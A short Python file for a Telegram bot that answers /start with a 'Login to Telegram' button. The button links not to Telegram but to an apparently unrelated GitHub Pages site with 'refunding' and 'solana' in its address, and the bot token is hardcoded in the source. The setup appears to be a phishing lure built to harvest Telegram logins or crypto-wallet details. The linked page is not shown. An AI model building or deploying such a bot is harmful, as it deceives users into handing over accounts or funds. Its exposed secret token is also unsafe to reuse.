import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, redirect

TOKEN = "7879598325:AAFRhrWVUanbI3gxEb4W6Bm1GroQTudgZUQ"
WEBAPP_URL = "https://refunding212.github.io/solana/"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route("/")
def home():
    return redirect("https://web.telegram.org/k/")

@bot.message_handler(commands=['start'])
def start(message):
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton("Login to Telegram", url=WEBAPP_URL)
    markup.add(button)
    bot.send_message(message.chat.id, "Click below to log in to Telegram:", reply_markup=markup)

if __name__ == "__main__":
    import threading
    threading.Thread(target=bot.polling, daemon=True).start()
    app.run(host="0.0.0.0", port=5000)
